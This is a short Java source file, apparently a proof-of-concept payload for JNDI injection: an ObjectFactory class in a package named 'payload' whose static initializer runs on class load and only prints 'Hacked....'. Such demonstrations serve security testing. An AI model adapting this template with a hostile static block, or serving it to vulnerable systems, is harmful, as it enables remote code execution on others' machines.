package itzbenz.payload;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Stdout implements ObjectFactory {
    static {
        System.out.println("Hacked....");
        System.err.println("Hacked....");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws
            Exception {
        return new Stdout();
    }
}
